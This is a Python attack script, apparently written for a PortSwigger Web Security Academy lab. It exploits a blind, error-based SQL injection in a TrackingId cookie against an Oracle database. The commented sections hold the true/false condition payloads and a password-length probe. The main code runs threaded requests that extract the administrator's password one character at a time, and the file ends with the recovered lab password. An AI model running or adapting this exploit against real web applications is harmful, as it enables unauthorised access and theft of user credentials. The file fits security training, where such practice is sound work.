#!/usr/bin/env python3

import requests


session = requests.Session()

url = 'https://0a2300b603c21b158158613100ba001b.web-security-academy.net/login'

# different cookies to do conditional erros
# cookies_condition_true = {"TrackingId": "mB4iTJWNm6WNfY0o' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"}
# cookies_condition_false = {"TrackingId": "mB4iTJWNm6WNfY0o' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"}


# r = session.get(url, cookies=cookies_condition_true)
# print(f'condition true result status: {r.status_code}')
#
# r = session.get(url, cookies=cookies_condition_false)
# print(f'condition false result status: {r.status_code}')


# find the length of password
# cookies_test_pwd_length = {"TrackingId": "mB4iTJWNm6WNfY0o' AND (SELECT CASE WHEN (LENGTH(password)>19) THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')='a"}
#
# r = session.get(url, cookies=cookies_test_pwd_length)
# print(f'condition false result status: {r.status_code}')


# found that length of password is 20 chars
# time to find the actual password
from string import digits, ascii_lowercase
from threading import Thread


# Shared variable to store the password
pwd = [''] * 20
printable = digits + ascii_lowercase

# Function to make requests and search for the correct character at a given position
def make_req_and_search(pos):
    for letter in printable:
        cookies = {"TrackingId": f"mB4iTJWNm6WNfY0o' AND (SELECT CASE WHEN (SUBSTR(password, {pos}, 1)='{letter}') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')='a"}

        r = session.get(url, cookies=cookies)

        if r.status_code == 200:
            pwd[pos - 1] = letter
            break

# # Start threads to find each character of the password
threads = []

for i in range(1, 21):  # Assuming the length of the password is 20
    thread = Thread(target=make_req_and_search, args=(i,))
    thread.daemon = True
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Output the found password
make_req_and_search(1)
print(f'Found password: {"".join(pwd)}')

# password found in lab: hzbn7p1kyep7v6fpbvrd
